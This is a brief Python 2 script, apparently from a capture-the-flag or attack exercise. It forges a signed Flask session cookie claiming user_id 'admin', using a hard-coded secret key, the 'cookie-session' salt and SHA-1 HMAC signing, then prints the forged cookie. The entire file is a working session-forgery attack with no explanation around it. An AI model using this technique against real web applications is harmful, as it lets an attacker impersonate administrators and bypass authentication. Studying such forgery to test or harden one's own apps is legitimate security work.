# -*- coding: utf-8 -*-

import hashlib

from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

session_json_serializer = TaggedJSONSerializer()

signer_kwargs = dict(
    key_derivation='hmac',
    digest_method=hashlib.sha1
)

key= '\xab\x80\xd2\x01\xf1F\xbc\x9e\xf4*o\x8e]\x81]NZt}N)\xb8A]'

salt = 'cookie-session'

serializer = URLSafeTimedSerializer(key, salt=salt,
    serializer=session_json_serializer,
    signer_kwargs=signer_kwargs)

session_content = {
    'user_id': 'admin',
    '_id': 'a2b16c036b629cb5a22c8f3d6779f2fd9dd3b0b7dc29f0555a0'
}


cookie_content = serializer.dumps(session_content)
print cookie_content
print serializer.loads(cookie_content)